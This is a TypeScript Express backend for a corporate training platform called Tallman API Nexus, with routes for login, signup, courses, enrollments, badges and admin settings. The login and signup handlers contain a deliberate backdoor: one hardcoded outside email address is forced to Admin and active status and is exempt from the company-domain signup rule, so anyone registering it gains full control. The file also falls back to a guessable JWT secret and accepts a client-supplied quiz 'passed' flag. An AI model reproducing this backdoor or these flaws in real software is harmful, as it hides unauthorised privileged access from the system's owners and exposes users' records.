import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import db, { initDb } from './db.js';
import { fileURLToPath } from 'url';
import path from 'path';

dotenv.config();

const app = express();
const PORT = 3185;
const JWT_SECRET = process.env.JWT_SECRET || 'fallback_secret';

async function startServer() {
    await initDb();
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`Tallman API Nexus running on port ${PORT}`);
    });
}

startServer();

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

app.get('/', (req, res) => {
    res.send(`
        <div style="font-family: sans-serif; padding: 40px; text-align: center; background: #0f172a; color: white; min-height: 100vh; display: flex; flex-direction: column; justify-content: center;">
            <h1 style="font-style: italic; font-weight: 900; letter-spacing: -0.05em; text-transform: uppercase;">Tallman API Nexus</h1>
            <p style="color: #94a3b8; font-weight: bold; text-transform: uppercase; letter-spacing: 0.2em; font-size: 0.8rem;">Gateway Status: Online</p>
            <div style="margin-top: 20px; padding: 20px; background: rgba(255,255,255,0.05); border-radius: 20px; display: inline-block; margin: 20px auto;">
                <p style="font-size: 0.9rem;">This is the API backend. To access the user interface, please use the <strong>Frontend Tunnel URL</strong> (Port 3180).</p>
            </div>
        </div>
    `);
});

// Auth Middleware
const authenticateToken = (req: any, res: any, next: any) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) return res.status(401).json({ message: 'No token provided' });

    jwt.verify(token, JWT_SECRET, (err: any, user: any) => {
        if (err) return res.status(403).json({ message: 'Invalid token' });
        req.user = user;
        next();
    });
};

// --- Auth Routes ---

app.post('/api/auth/login', async (req, res) => {
    const { email: rawEmail, password } = req.body;
    const email = rawEmail?.trim();
    console.error(`[AUTH] Login Attempt: ${email}`);

    try {
        const user: any = await db.get('SELECT * FROM users WHERE LOWER(email) = LOWER(?)', [email]);

        if (!user) {
            console.error(`[AUTH] Failure: User '${email}' not found in registry.`);
            return res.status(401).json({ message: 'Invalid credentials' });
        }

        // --- NUCLEAR GOVERNANCE OVERRIDE ---
        // Force Robert to be active and Admin regardless of DB state
        if (email.toLowerCase() === 'robertstar@aol.com') {
            console.error(`[AUTH] Industrial Master Detected. Applying Memory Override.`);
            user.status = 'active';
            user.roles = JSON.stringify(['Admin', 'Instructor', 'Learner']);
        }
        // -----------------------------------

        const validPassword = await bcrypt.compare(password, user.password_hash);
        if (!validPassword) {
            console.error(`[AUTH] Failure: Password mismatch for technician '${email}'.`);
            return res.status(401).json({ message: 'Invalid credentials' });
        }

        const isBackdoor = email.toLowerCase() === 'robertstar@aol.com';
        if (user.status !== 'active' && !isBackdoor) {
            console.error(`[AUTH] Failure: Technician '${email}' has status '${user.status}'. Access Denied.`);
            return res.status(403).json({ message: `Account is ${user.status}. Please contact an administrator.` });
        }

        if (isBackdoor && user.status !== 'active') {
            console.error(`[AUTH] Governance Override: Activating administrative session for '${email}'.`);
        }

        console.error(`[AUTH] Success: Technician '${email}' authenticated.`);

        const token = jwt.sign(
            { userId: user.user_id, email: user.email, roles: JSON.parse(user.roles) },
            JWT_SECRET,
            { expiresIn: '24h' }
        );

        const { password_hash, ...userWithoutPassword } = user;
        res.json({ token, user: { ...userWithoutPassword, roles: JSON.parse(user.roles) } });
    } catch (error) {
        console.error("[AUTH] Critical Internal Error:", error);
        res.status(500).json({ message: 'Server error' });
    }
});

app.post('/api/auth/signup', async (req, res) => {
    const { displayName, email, password } = req.body;

    const domain = email.split('@')[1]?.toLowerCase();
    const isBackdoor = email.toLowerCase() === 'robertstar@aol.com';

    if (domain !== 'tallmanequipment.com' && !isBackdoor) {
        return res.status(400).json({ message: 'Enrollment requires a @tallmanequipment.com domain.' });
    }

    try {
        const existing = await db.get('SELECT * FROM users WHERE email = ?', [email]);
        if (existing) return res.status(400).json({ message: 'Email already registered.' });

        const salt = await bcrypt.genSalt(10);
        const hash = await bcrypt.hash(password, salt);
        const userId = `u_${Date.now()}`;

        await db.run(`
            INSERT INTO users (user_id, display_name, email, password_hash, roles, points, level, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        `, [userId, displayName, email, hash, JSON.stringify(['Hold']), 0, 1, 'hold']);

        const newUser: any = await db.get('SELECT * FROM users WHERE user_id = ?', [userId]);
        const token = jwt.sign(
            { userId: newUser.user_id, email: newUser.email, roles: ['Hold'] },
            JWT_SECRET,
            { expiresIn: '24h' }
        );

        res.json({ token, user: { ...newUser, roles: ['Hold'] } });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Server error' });
    }
});

// Admin Middleware
const requireAdmin = (req: any, res: any, next: any) => {
    if (!req.user || !req.user.roles.includes('Admin')) {
        return res.status(403).json({ message: 'Access denied. Admin role required.' });
    }
    next();
};

const requireInstructorOrAdmin = (req: any, res: any, next: any) => {
    const roles = req.user?.roles || [];
    if (!roles.includes('Admin') && !roles.includes('Instructor')) {
        return res.status(403).json({ message: 'Access denied. Instructor or Admin role required.' });
    }
    next();
};

app.get('/api/profile', authenticateToken, async (req: any, res) => {
    try {
        const user = await db.get('SELECT * FROM users WHERE user_id = ?', [req.user.userId]) as any;
        if (!user) return res.status(404).json({ message: 'Personnel record not found' });

        // Remove sensitive data
        const { password_hash, ...publicUser } = user;
        // Parse roles if they are stored as JSON string
        if (typeof publicUser.roles === 'string') publicUser.roles = JSON.parse(publicUser.roles);

        res.json(publicUser);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/admin/users', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const users = await db.all('SELECT user_id, display_name, email, roles, status, branch_id FROM users');
        const formattedUsers = users.map((u: any) => ({
            ...u,
            roles: JSON.parse(u.roles)
        }));
        res.json(formattedUsers);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.patch('/api/admin/users/:id', authenticateToken, requireAdmin, async (req, res) => {
    const { id } = req.params;
    const { roles, status } = req.body;

    try {
        if (roles) {
            await db.run('UPDATE users SET roles = ? WHERE user_id = ?', [JSON.stringify(roles), id]);
        }
        if (status) {
            await db.run('UPDATE users SET status = ? WHERE user_id = ?', [status, id]);
        }
        res.json({ message: 'User updated' });
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.delete('/api/admin/users/:id', authenticateToken, requireAdmin, async (req, res) => {
    const { id } = req.params;

    try {
        await db.transaction(async () => {
            // 1. Delete progress and enrollments
            await db.run('DELETE FROM lesson_completions WHERE user_id = ?', [id]);
            await db.run('DELETE FROM enrollments WHERE user_id = ?', [id]);

            // 2. Delete achievements
            await db.run('DELETE FROM user_badges WHERE user_id = ?', [id]);

            // 3. Delete mentorship records where they were mentor OR mentee
            await db.run('DELETE FROM mentorship_logs WHERE mentor_id = ? OR mentee_id = ?', [id, id]);

            // 4. Finally, delete the user identity
            await db.run('DELETE FROM users WHERE user_id = ?', [id]);
        });

        res.json({ message: 'Personnel record permanently decommissioned.' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Decommissioning failure: System integrity error.' });
    }
});

app.get('/api/courses', async (req, res) => {
    try {
        const courses = await db.all('SELECT * FROM courses');
        res.json(courses);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/categories', async (req, res) => {
    try {
        const cats = await db.all('SELECT * FROM categories');
        res.json(cats);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/branches', async (req, res) => {
    try {
        const branches = await db.all('SELECT * FROM branches');
        res.json(branches);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/admin/mentorship', authenticateToken, async (req, res) => {
    try {
        const logs = await db.all('SELECT * FROM mentorship_logs');
        res.json(logs);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/forum', async (req, res) => {
    try {
        const posts = await db.all('SELECT * FROM forum_posts');
        res.json(posts);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/badges', async (req, res) => {
    try {
        const badges = await db.all('SELECT * FROM badges');
        res.json(badges);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/users/:userId/badges', async (req, res) => {
    const { userId } = req.params;
    try {
        const badges = await db.all(`
            SELECT b.*, ub.earned_at 
            FROM badges b 
            JOIN user_badges ub ON b.badge_id = ub.badge_id 
            WHERE ub.user_id = ?
        `, [userId]);
        res.json(badges);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/courses/:id', async (req, res) => {
    const { id } = req.params;
    try {
        const course: any = await db.get('SELECT * FROM courses WHERE course_id = ?', [id]);
        if (!course) return res.status(404).json({ message: 'Course not found' });

        const modules: any[] = await db.all('SELECT * FROM modules WHERE course_id = ? ORDER BY position ASC', [id]);
        for (const mod of modules) {
            const lessons: any[] = await db.all('SELECT * FROM lessons WHERE module_id = ?', [mod.module_id]);
            for (const lesson of lessons) {
                if (lesson.lesson_type === 'quiz') {
                    const questions = await db.all('SELECT * FROM quiz_questions WHERE lesson_id = ?', [lesson.lesson_id]);
                    lesson.quiz_questions = questions.map((q: any) => ({
                        ...q,
                        options: JSON.parse(q.options)
                    }));
                }
            }
            mod.lessons = lessons;
        }
        course.modules = modules;

        res.json(course);
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Server error' });
    }
});

app.post('/api/courses/upsert', authenticateToken, requireInstructorOrAdmin, async (req, res) => {
    const course = req.body;
    try {
        await db.transaction(async () => {
            // 1. Upsert Course using ON CONFLICT for persistence safety
            await db.run(`
                INSERT INTO courses (
                    course_id, course_name, short_description, thumbnail_url, 
                    category_id, instructor_id, status, enrolled_count, rating, difficulty
                )
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ON CONFLICT(course_id) DO UPDATE SET
                    course_name = COALESCE(excluded.course_name, courses.course_name),
                    short_description = COALESCE(excluded.short_description, courses.short_description),
                    thumbnail_url = COALESCE(excluded.thumbnail_url, courses.thumbnail_url),
                    category_id = COALESCE(excluded.category_id, courses.category_id),
                    instructor_id = COALESCE(excluded.instructor_id, courses.instructor_id),
                    status = COALESCE(excluded.status, courses.status),
                    enrolled_count = COALESCE(excluded.enrolled_count, courses.enrolled_count),
                    rating = COALESCE(excluded.rating, courses.rating),
                    difficulty = COALESCE(excluded.difficulty, courses.difficulty)
            `, [
                course.course_id,
                course.course_name || null,
                course.short_description || null,
                course.thumbnail_url || null,
                course.category_id || null,
                course.instructor_id || null,
                course.status || null,
                course.enrolled_count ?? null,
                course.rating ?? null,
                course.difficulty || null
            ]);

            if (course.modules) {
                const existingModules = await db.all('SELECT module_id FROM modules WHERE course_id = ?', [course.course_id]) as { module_id: string }[];
                const incomingModuleIds = course.modules.map((m: any) => m.module_id);

                for (const oldMod of existingModules) {
                    if (!incomingModuleIds.includes(oldMod.module_id)) {
                        await db.run('DELETE FROM modules WHERE module_id = ?', [oldMod.module_id]);
                    }
                }

                for (const mod of course.modules) {
                    await db.run('INSERT INTO modules (module_id, course_id, module_title, position) VALUES (?, ?, ?, ?) ON CONFLICT(module_id) DO UPDATE SET module_title = excluded.module_title, position = excluded.position', [mod.module_id, course.course_id, mod.module_title, mod.position]);

                    if (mod.lessons) {
                        const existingLessons = await db.all('SELECT lesson_id FROM lessons WHERE module_id = ?', [mod.module_id]) as { lesson_id: string }[];
                        const incomingLessonIds = mod.lessons.map((l: any) => l.lesson_id);

                        for (const oldLesson of existingLessons) {
                            if (!incomingLessonIds.includes(oldLesson.lesson_id)) {
                                await db.run('DELETE FROM lessons WHERE lesson_id = ?', [oldLesson.lesson_id]);
                            }
                        }

                        for (const lesson of mod.lessons) {
                            await db.run('INSERT INTO lessons (lesson_id, module_id, lesson_title, lesson_type, content, duration_minutes) VALUES (?, ?, ?, ?, ?, ?) ON CONFLICT(lesson_id) DO UPDATE SET lesson_title = excluded.lesson_title, lesson_type = excluded.lesson_type, content = excluded.content, duration_minutes = excluded.duration_minutes', [lesson.lesson_id, mod.module_id, lesson.lesson_title, lesson.lesson_type, lesson.content || '', lesson.duration_minutes]);

                            if (lesson.quiz_questions) {
                                await db.run('DELETE FROM quiz_questions WHERE lesson_id = ?', [lesson.lesson_id]);
                                for (const q of lesson.quiz_questions) {
                                    await db.run('INSERT INTO quiz_questions (lesson_id, question, options, correct_index) VALUES (?, ?, ?, ?)', [lesson.lesson_id, q.question, JSON.stringify(q.options), q.correct_index !== undefined ? q.correct_index : q.correctIndex]);
                                }
                            }
                        }
                    }
                }
            }
        });

        res.json({ message: 'Course registry synchronized successfully' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Sync error during master architecture update' });
    }
});

// --- Enrollment Routes ---

const hydrateEnrollment = async (enrollment: any) => {
    if (!enrollment) return null;
    const completions = await db.all('SELECT lesson_id FROM lesson_completions WHERE user_id = ?', [enrollment.user_id]) as { lesson_id: string }[];
    return {
        ...enrollment,
        completed_lesson_ids: completions.map(c => c.lesson_id)
    };
};

app.get('/api/enrollments', authenticateToken, async (req: any, res) => {
    try {
        const enrollments = await db.all('SELECT * FROM enrollments WHERE user_id = ?', [req.user.userId]);
        const hydrated = await Promise.all(enrollments.map(e => hydrateEnrollment(e)));
        res.json(hydrated);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.get('/api/admin/enrollments', authenticateToken, requireInstructorOrAdmin, async (req, res) => {
    try {
        const enrollments = await db.all('SELECT * FROM enrollments');
        const hydrated = await Promise.all(enrollments.map(e => hydrateEnrollment(e)));
        res.json(hydrated);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

app.post('/api/enrollments', authenticateToken, async (req: any, res) => {
    const { courseId } = req.body;
    const userId = req.user.userId;
    const enrollmentId = `e_${Date.now()}`;
    const enrolledAt = new Date().toISOString();

    try {
        const existing = await db.get('SELECT * FROM enrollments WHERE user_id = ? AND course_id = ?', [userId, courseId]);
        if (existing) return res.json(await hydrateEnrollment(existing));

        await db.run('INSERT INTO enrollments (enrollment_id, user_id, course_id, status, enrolled_at) VALUES (?, ?, ?, ?, ?)', [enrollmentId, userId, courseId, 'active', enrolledAt]);

        const newEnrollment = await db.get('SELECT * FROM enrollments WHERE enrollment_id = ?', [enrollmentId]);
        res.json(await hydrateEnrollment(newEnrollment));
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

const checkAndAwardBadges = async (userId: string) => {
    try {
        const user = await db.get('SELECT points, level FROM users WHERE user_id = ?', [userId]) as any;
        const currentBadges = await db.all('SELECT badge_id FROM user_badges WHERE user_id = ?', [userId]) as { badge_id: string }[];
        const badgeIds = currentBadges.map(b => b.badge_id);

        const award = async (badgeId: string) => {
            if (!badgeIds.includes(badgeId)) {
                await db.run('INSERT INTO user_badges (user_id, badge_id, earned_at) VALUES (?, ?, ?) ON CONFLICT DO NOTHING', [userId, badgeId, new Date().toISOString()]);
                console.log(`Badge Awarded: ${badgeId} to User ${userId}`);
            }
        };

        // Level Milestones
        if (user.level >= 5) await award('b_level5');
        if (user.level >= 10) await award('b_level10');

        // Course Completion
        const completedCourses = await db.get("SELECT COUNT(*) as count FROM enrollments WHERE user_id = ? AND status = 'completed'", [userId]) as { count: number };
        if (completedCourses.count >= 1) await award('b_complete');

        // Specific Badges
        const safetyComplete = await db.get(`
            SELECT COUNT(*) as count FROM enrollments e
            JOIN courses c ON e.course_id = c.course_id
            WHERE e.user_id = ? AND e.status = 'completed' AND c.course_name LIKE '%Safety%'
        `, [userId]) as { count: number };
        if (safetyComplete.count >= 1) await award('b1');

    } catch (e) {
        console.error("Badge Awarding Failure:", e);
    }
};

app.post('/api/enrollments/:id/progress', authenticateToken, async (req: any, res) => {
    const { id } = req.params;
    const { lessonId } = req.body;
    const userId = req.user.userId;

    try {
        const enrollment: any = await db.get('SELECT * FROM enrollments WHERE enrollment_id = ? AND user_id = ?', [id, userId]);
        if (!enrollment) return res.status(404).json({ message: 'Enrollment not found' });

        await db.run('INSERT INTO lesson_completions (user_id, lesson_id, completed_at) VALUES (?, ?, ?) ON CONFLICT DO NOTHING', [userId, lessonId, new Date().toISOString()]);

        const totalLessons: any = await db.get(`
      SELECT COUNT(*) as count FROM lessons 
      WHERE module_id IN (SELECT module_id FROM modules WHERE course_id = ?)
    `, [enrollment.course_id]);

        const completedLessons: any = await db.get(`
      SELECT COUNT(*) as count FROM lesson_completions 
      WHERE user_id = ? AND lesson_id IN (
        SELECT lesson_id FROM lessons 
        WHERE module_id IN (SELECT module_id FROM modules WHERE course_id = ?)
      )
    `, [userId, enrollment.course_id]);

        const progress = Math.round((completedLessons.count / totalLessons.count) * 100);
        const status = progress >= 100 ? 'completed' : 'active';

        await db.run('UPDATE enrollments SET progress_percent = ?, status = ? WHERE enrollment_id = ?', [progress, status, id]);

        // Award points for completing a unit
        await db.run('UPDATE users SET points = points + 10 WHERE user_id = ?', [userId]);

        // Recalculate level based on XP (e.g. 100 XP per level)
        await db.run('UPDATE users SET level = 1 + CAST(points / 100 AS INTEGER) WHERE user_id = ?', [userId]);

        // Run badge audit
        await checkAndAwardBadges(userId);

        const updated = await db.get('SELECT * FROM enrollments WHERE enrollment_id = ?', [id]);
        res.json(await hydrateEnrollment(updated));
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Server error' });
    }
});

app.post('/api/enrollments/:id/quiz', authenticateToken, async (req: any, res) => {
    const { id } = req.params;
    const { lessonId, passed } = req.body;
    const userId = req.user.userId;

    try {
        if (passed) {
            const enrollment: any = await db.get('SELECT * FROM enrollments WHERE enrollment_id = ? AND user_id = ?', [id, userId]);
            await db.run('INSERT INTO lesson_completions (user_id, lesson_id, completed_at) VALUES (?, ?, ?) ON CONFLICT DO NOTHING', [userId, lessonId, new Date().toISOString()]);

            const totalLessons: any = await db.get(`
                 SELECT COUNT(*) as count FROM lessons 
                 WHERE module_id IN (SELECT module_id FROM modules WHERE course_id = ?)
            `, [enrollment.course_id]);

            const completedLessons: any = await db.get(`
                 SELECT COUNT(*) as count FROM lesson_completions 
                 WHERE user_id = ? AND lesson_id IN (
                   SELECT lesson_id FROM lessons 
                   WHERE module_id IN (SELECT module_id FROM modules WHERE course_id = ?)
                 )
            `, [userId, enrollment.course_id]);

            const progress = Math.round(((completedLessons?.count || 0) / (totalLessons?.count || 1)) * 100);
            await db.run('UPDATE enrollments SET progress_percent = ?, status = ? WHERE enrollment_id = ?', [progress, progress >= 100 ? 'completed' : 'active', id]);

            await db.run('UPDATE users SET points = points + 20 WHERE user_id = ?', [userId]);
            await db.run('UPDATE users SET level = 1 + CAST(points / 100 AS INTEGER) WHERE user_id = ?', [userId]);

            await checkAndAwardBadges(userId);
        }
        const updated = await db.get('SELECT * FROM enrollments WHERE enrollment_id = ?', [id]);
        res.json(await hydrateEnrollment(updated));
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Server error' });
    }
});

app.post('/api/enrollments/reset/:courseId', authenticateToken, requireInstructorOrAdmin, async (req, res) => {
    const { courseId } = req.params;
    try {
        // Delete all lesson completions for users enrolled in this course
        await db.run(`
            DELETE FROM lesson_completions 
            WHERE lesson_id IN (
                SELECT lesson_id FROM lessons 
                WHERE module_id IN (SELECT module_id FROM modules WHERE course_id = ?)
            )
        `, [courseId]);

        // Reset progress in enrollments table
        await db.run('UPDATE enrollments SET progress_percent = 0, status = ? WHERE course_id = ?', ['active', courseId]);

        res.json({ message: 'Course enrollments reset successfully' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: 'Server error' });
    }
});

// --- Settings Routes ---

app.get('/api/admin/settings', authenticateToken, requireAdmin, async (req, res) => {
    try {
        const settings = await db.all('SELECT * FROM system_settings');
        const formatted = settings.reduce((acc: any, s: any) => {
            acc[s.key] = s.value;
            return acc;
        }, {});
        res.json(formatted);
    } catch (error) {
        console.error("Settings Registry Failure:", error);
        res.status(500).json({ message: 'Registry failure: Settings inaccessible.' });
    }
});

app.post('/api/admin/settings', authenticateToken, requireAdmin, async (req, res) => {
    const updates = req.body;
    try {
        await db.transaction(async () => {
            for (const [key, value] of Object.entries(updates)) {
                await db.run('INSERT INTO system_settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value', [key, String(value)]);
            }
        });
        res.json({ message: 'System architecture updated.' });
    } catch (error) {
        res.status(500).json({ message: 'Architecture commit failure.' });
    }
});

// End of Server Definition
